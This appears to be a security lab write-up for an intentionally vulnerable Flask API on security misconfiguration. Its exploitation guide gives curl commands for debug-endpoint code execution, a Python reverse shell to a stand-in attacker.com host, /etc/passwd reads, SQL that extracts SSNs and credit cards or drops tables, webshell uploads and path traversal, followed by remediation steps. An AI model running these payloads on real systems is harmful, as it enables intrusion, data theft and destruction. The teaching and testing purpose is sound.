API8:2023 Security Misconfiguration

CRITICAL SEVERITY

Description

Security misconfiguration includes debug mode enabled in production, verbose error messages, unnecessary features enabled, missing security hardening, permissive CORS, exposed sensitive files, and default credentials.

Affected Files

  • app/config.py - Hardcoded secrets, debug mode
  • app/__init__.py - Verbose errors, permissive CORS
  • app/routes/debug.py - Debug endpoints exposed
  • app/routes/admin.py - Config exposure, raw SQL
  • app/routes/files.py - Dangerous file uploads
  • run.py - Debug mode, binding to 0.0.0.0

Exploitation Guide

1. Debug Mode Enabled

Flask debug mode exposes detailed errors and allows code execution:

# Trigger error to see stack trace
curl "http://localhost:5000/api/debug/error?type=division"

# Response includes:
# - Full stack trace
# - File paths
# - Python path
# - Local variables

# Interactive debugger (if Werkzeug debugger enabled)
# Would allow RCE via debug PIN

2. Hardcoded Secrets

Secrets are hardcoded in configuration:

# Get configuration including secrets
curl http://localhost:5000/api/admin/config \
  -H "Authorization: Bearer $TOKEN"

# Response includes:
# SECRET_KEY: 'super-secret-key-12345'
# JWT_SECRET: 'jwt-secret-weak'
# ADMIN_USERNAME: 'admin'
# ADMIN_PASSWORD: 'admin123'

# Debug endpoint also exposes secrets
curl http://localhost:5000/api/debug/config

3. Remote Code Execution

Debug endpoints allow arbitrary code execution:

# Execute arbitrary Python code
curl -X POST http://localhost:5000/api/debug/execute \
  -H "Content-Type: application/json" \
  -d '{"code": "import os; result = os.popen(\"id\").read()"}'

# Evaluate expressions
curl -X POST http://localhost:5000/api/debug/eval \
  -H "Content-Type: application/json" \
  -d '{"expression": "__import__(\"os\").popen(\"whoami\").read()"}'

# Read sensitive files
curl -X POST http://localhost:5000/api/debug/execute \
  -H "Content-Type: application/json" \
  -d '{"code": "result = open(\"/etc/passwd\").read()"}'

# Reverse shell (EDUCATIONAL ONLY)
curl -X POST http://localhost:5000/api/debug/execute \
  -H "Content-Type: application/json" \
  -d '{"code": "import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"}'

4. SQL Injection via Admin Endpoint

# Direct SQL execution
curl -X POST http://localhost:5000/api/admin/database/query \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "SELECT * FROM users"}'

# Data exfiltration
curl -X POST http://localhost:5000/api/admin/database/query \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "SELECT username, password, ssn, credit_card FROM users"}'

# Data modification
curl -X POST http://localhost:5000/api/admin/database/query \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "UPDATE users SET role = '\''admin'\'' WHERE username = '\''john'\''"}'

# Table deletion
curl -X POST http://localhost:5000/api/admin/database/query \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "DROP TABLE IF EXISTS audit_logs"}'

5. Environment Variable Exposure

# Get all environment variables
curl http://localhost:5000/api/debug/env

# System info endpoint
curl http://localhost:5000/api/admin/system/info

# phpinfo-style disclosure
curl http://localhost:5000/api/debug/phpinfo

6. Permissive CORS

CORS allows requests from any origin:

# Check CORS headers
curl -I -X OPTIONS http://localhost:5000/api/users \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: GET"

# Response headers:
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH, OPTIONS
# Access-Control-Allow-Headers: *

# Any website can now make authenticated requests!

7. Dangerous File Uploads

No restriction on uploaded file types:

# Upload PHP webshell
echo '' > shell.php
curl -X POST http://localhost:5000/api/files/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@shell.php"

# Upload executable
curl -X POST http://localhost:5000/api/files/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@malware.exe"

# Path traversal in filename
curl -X POST http://localhost:5000/api/files/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@shell.php;filename=../../../var/www/html/shell.php"

8. Path Traversal

# Read /etc/passwd
curl -X POST http://localhost:5000/api/files/read \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"filename": "../../../etc/passwd"}'

# Read application source
curl -X POST http://localhost:5000/api/files/read \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"filename": "../app/config.py"}'

# Download traversal
curl "http://localhost:5000/api/files/download/../../../etc/passwd"

9. Verbose Error Messages

# Trigger various errors
curl "http://localhost:5000/api/debug/error?type=division"
curl "http://localhost:5000/api/debug/error?type=attribute"
curl "http://localhost:5000/api/debug/error?type=index"

# Errors reveal:
# - Full file paths
# - Stack traces
# - Internal variable values
# - Python version and paths

Impact

  • Remote Code Execution: Full server compromise
  • Data Breach: Access to all secrets and data
  • Server Takeover: Reverse shells, malware upload
  • Credential Theft: Database passwords, API keys
  • Cross-Site Attacks: Permissive CORS enables CSRF

Remediation

  1. Disable debug mode in production
  2. Use environment variables for secrets
  3. Remove debug/test endpoints
  4. Implement proper CORS policy
  5. Validate and sanitize file uploads
  6. Use generic error messages
  7. Remove raw SQL query endpoints
  8. Regular security audits
